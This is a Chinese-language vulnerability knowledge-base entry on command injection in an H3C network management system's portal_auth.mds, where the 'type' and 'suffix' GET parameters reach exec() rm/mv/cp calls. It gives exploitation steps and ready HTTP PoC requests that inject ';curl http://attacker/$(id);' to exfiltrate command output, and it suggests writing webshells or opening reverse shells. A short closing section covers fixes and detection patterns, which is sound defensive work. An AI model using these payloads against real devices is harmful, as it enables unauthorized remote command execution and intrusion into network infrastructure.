---
id: web-php-rce-h3c-mds-portal-auth-exec-type-suffix-injection
title: H3C 网管 portal_auth.mds 的 exec 拼接命令执行：config_reset 路由 type 进入 rm、local_submit 路由 suffix 进入 checkFileSize 的 mv/rm，backupAuthFile 的 cp 同源
type: scenario
domain: web
path: web/php/rce
technique: h3c-mds-portal-auth-exec-command-injection
aliases:
- H3C 网管系统命令执行
- portal_auth.mds
- aaa_portal_auth_config_reset
- aaa_portal_auth_local_submit
- checkFileSize 命令注入
- backupAuthFile exec
tags:
- php
- command-injection
- exec
- h3c
- mds
- portal-auth
- source-audit
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V551
  verified_at: '2026-11-11T22:37:31+08:00'
  notes: 已对照原文与全部 17 张截图核对：图11 config_reset 分支 $type=$_GET['type'] 后 exec('rm '.$portal_catalog.'/'.$type.'/images/'.$type.'*')、file_put_contents(config.txt)、backupAuthFile($type)；图9 backupAuthFile 的 exec('cp -rf /usr/local/webui/auth/portal/'.$type.'/ /mnt/auth_file/') 与 checkFileSize 的 move_uploaded_file+exec('rm '.tmp)/exec('mv '.tmp.' '.final)；图14 suffix=$_GET['suffix'] 拼入 localLogo_tmp/localLogo 文件名后调用 checkFileSize；图12 success.html 对 config.txt 做 eval；图10 实测 config_reset type 注入落 phpinfo 到 test.php 并访问成功，图15 实测 local_submit suffix='.png;echo ...>aaa.php' 返回 {"success":"local_logo"} 且 aaa.php 生效，命令注入实锤。核对中已修正前置条件：baseFlag==1 会进入 base 配置分支并 return（原文'baseFlag 需已定义'与代码相反），改为避开 baseFlag==1 且 bkg_flag=0/上传<2MB；并注明 Referer 检查在原文实测中未阻断（请求未带 Referer 仍返回路由结果）。dedup 仅自身 exact，其余为 LibreOffice shell_exec、Yaf cmd、瑞斯康达 template、mv 选项注入等不同系统，无同链重复。原文未标注 H3C 版本，未设 affected_versions。未验证点：未复现不同版本与 disable_functions 场景；success.html eval(config.txt) 为浏览器侧关联风险，原文未单独验证。
---

## 一句话结论

H3C 网管网关的 `portal_auth.mds` 多处把 GET 参数直接拼进 `exec()`：`g=aaa_portal_auth_config_reset` 的 `type` 进入 `rm` 命令，`g=aaa_portal_auth_local_submit` 的 `suffix` 进入上传临时/最终文件名后被 `checkFileSize()` 的 `mv`/`rm` 执行，`backupAuthFile()` 的 `cp -rf` 也用同一 `type` 拼接；只要参数含 `;`、`|`、`$()` 等 shell 元字符即可在 Web 进程权限下执行任意系统命令。

## 原理

- **PHP `exec()` 的语义**：`exec()` 调用 `/bin/sh -c` 执行字符串，字符串中的 `;`、`&&`、`|`、`$()`、反引号、换行都会被 shell 解释。代码没有使用 `escapeshellarg()`/`escapeshellcmd()`，也没有对参数做白名单，用户输入直接拼入命令即形成命令注入。
- **config_reset 注入点**：`g=aaa_portal_auth_config_reset` 分支取 `$type = $_GET['type']`，随后执行 `exec('rm '.$portal_catalog.'/'.$type.'/images/'.$type.'*')`。`$type` 同时出现在路径和通配符前，攻击者用 `;` 闭合 `rm` 并追加任意命令即可；之后的 `backupAuthFile($type)` 中 `exec('cp -rf /usr/local/webui/auth/portal/'.$type.'/ /mnt/auth_file/')` 同样拼接 `$type`，是同一根因的第二个 sink。
- **local_submit / checkFileSize 注入点**：`g=aaa_portal_auth_local_submit` 分支取 `$suffix = $_GET['suffix']`，在 `bkg_flag=0` 且上传 `local_logo_file` 成功时，构造 `$tmp_name = $portal_catalog.'/local/images/localLogo_tmp'.$suffix;`、`$final_name = $portal_catalog.'/local/images/localLogo'.$suffix;`，调用 `checkFileSize($type,$tmp_name,$final_name,$uploadFileSize)`；函数内先 `move_uploaded_file`，再在文件超限时 `exec('rm '.$tmp_name)`、否则 `exec('mv '.$tmp_name.' '.$final_name)`。`$suffix` 原样进入两条命令，可用 `;`/`#` 注入。
- **前置条件链**：全局入口对 `g` 不是 `nobusiness_*` 且不是 `main` 的请求做 `Referer` 包含当前 Host 的检查，不满足时输出跳转 `/logout.php`（原文实测请求未带 Referer 仍返回路由结果，该检查未必阻断执行，PoC 带同 Host Referer 更稳妥）；local_submit 需避开 `baseFlag==1` 的 base 配置分支（该分支会 `return`），并满足 `bkg_flag=0`、上传成功且文件小于 `$uploadFileSize = 2097152`（约 2MB），才能走到 `checkFileSize` 的 else/mv 分支。
- **同文件的另一个数据流**：该分支会把配置数组 `json_encode` 后 `file_put_contents($portal_catalog."/config.txt", $new_config)`，前端 `success.html` 用 `$.get('../config.txt')` 取回后 `data = eval('('+data+')')`。若 `type`/配置值能影响 `config.txt` 内容，可导致浏览器侧执行注入的 JS（存储型 XSS/前端逻辑劫持）；原文未单独验证这一分支，属于关联风险而非服务端命令执行。

## 触发条件

- 可访问 `/webui/index.php` 并具备有效会话；请求带包含当前 Host 的 `Referer`（全局 Referer 校验）。
- 目标存在 `portal_auth.mds` 且 `aaa_portal_auth_config_reset` / `aaa_portal_auth_local_submit` 分支可达。
- local_submit 路径需能上传文件（`local_logo_file`）、上传成功且文件小于 2MB，`bkg_flag=0` 进入上传处理。
- Web 进程对 `$portal_catalog` 目录有写/执行权限（通常需要），且系统存在 `/bin/sh` 与 `rm`/`mv` 命令。

## 利用步骤

1. 登录/获取会话，访问任一 `g=` 路由确认 Referer 校验行为（带同 Host Referer 可正常进入）。
2. （config_reset 路线）向 `g=aaa_portal_auth_config_reset` 发送 `type` 参数，用 shell 元字符闭合 `rm` 并执行命令；`type` 会被 URL 编码。
3. （local_submit 路线）向 `g=aaa_portal_auth_local_submit&bkg_flag=0` 上传一个小于 2MB 的任意文件（字段名 `local_logo_file`），`suffix` 用 `;命令;#` 形式，使 `checkFileSize` 的 `mv` 命令后追加执行。
4. 由于 `exec()` 不回显命令输出，验证时使用带外方式（`curl http://attacker/$(id)`、DNSLog、写文件到 Web 目录）确认执行。
5. 进一步可写入 WebShell 或反弹 Shell，结合文件读取获取的配置提升权限。

## PoC

config_reset 路线（`type` 解码后为 `;curl http://attacker/$(id);`）：

```http
GET /webui/index.php?g=aaa_portal_auth_config_reset&type=%3Bcurl%20http%3A%2F%2Fattacker%2F%24%28id%29%3B HTTP/1.1
Host: <target>
Cookie: USGSESSID=<session>
Referer: https://<target>/webui/
```

local_submit 路线（`suffix` 解码后为 `.php;curl http://attacker/$(id);#`）：

```http
POST /webui/index.php?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=.php%3Bcurl%20http%3A%2F%2Fattacker%2F%24%28id%29%3B%23 HTTP/1.1
Host: <target>
Cookie: USGSESSID=<session>
Referer: https://<target>/webui/
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="local_logo_file"; filename="x.png"
Content-Type: image/png

<小于 2MB 的文件内容>
------x--
```

对应代码要点：

```php
// config_reset
$type = $_GET['type'];
exec('rm '.$portal_catalog.'/'.$type.'/images/'.$type.'*');
backupAuthFile($type);   // exec('cp -rf /usr/local/webui/auth/portal/'.$type.'/ /mnt/auth_file/')

// local_submit -> checkFileSize
$suffix = $_GET['suffix'];
$tmp_name   = $portal_catalog.'/local/images/localLogo_tmp'.$suffix;
$final_name = $portal_catalog.'/local/images/localLogo'.$suffix;
checkFileSize('local_logo_file', $tmp_name, $final_name, 2097152);
// checkFileSize: exec('rm '.$tmp_name) / exec('mv '.$tmp_name.' '.$final_name)
```

## 变体与关联

- 变体：`backupAuthFile()` 的 `cp -rf` 拼接与 config_reset 共用 `$type`，即使不进入 `rm` 分支也可注入；批量审计时应把所有 `exec` 调用的参数回溯到 `$_GET`/`$_POST`。
- 变体：`checkFileSize()` 的 `$tmp_name`/`$final_name` 还可通过文件名本身（multipart filename）影响，若 `move_uploaded_file` 与 `exec` 均使用原名，可在文件名中注入。
- 关联：[[web-php-file-inclusion-h3c-mds-syscorefile-filename-traversal-read]]（同系统 `.mds` 路由的任意文件读取）、[[web-php-rce-wbce-install-language-file-getcontents-rce]]（PHP 拼接命令/文件写入类 RCE 的对照）。
- 边界：需要有效会话与 Referer；`exec` 被 `disable_functions` 禁用时失效；`$portal_catalog` 不存在时 `rm` 先报错但 `;` 后的命令仍会执行；前端 `success.html` 的 `eval(config.txt)` 仅在浏览器侧，不等同于服务端命令执行。

## 检测与防御

- 修复：对所有进入 `exec()` 的参数使用 `escapeshellarg()`；对 `type`、`suffix` 做严格白名单（如只允许 `adv|diff|free|local` 与固定后缀），禁止路径分隔符与 shell 元字符；尽量改为 PHP 原生文件操作（`unlink`/`rename`）替代 `rm`/`mv`。
- 加固：`disable_functions` 禁用 `exec`/`system`/`shell_exec`；上传目录与配置目录分离，Web 进程最小权限。
- 检测：Web 日志中出现 `g=aaa_portal_auth_config_reset` / `aaa_portal_auth_local_submit` 且 `type`/`suffix` 含 `%3B`、`%7C`、`%24%28`、反引号、换行的请求；主机侧出现 Web 进程派生的 `sh -c rm/mv/cp` 异常子进程与对外连接。
- 审计：`.mds` 文件纳入 SAST/IDE 索引；全局搜索 `exec(`、`system(`、`shell_exec(` 并检查参数来源。
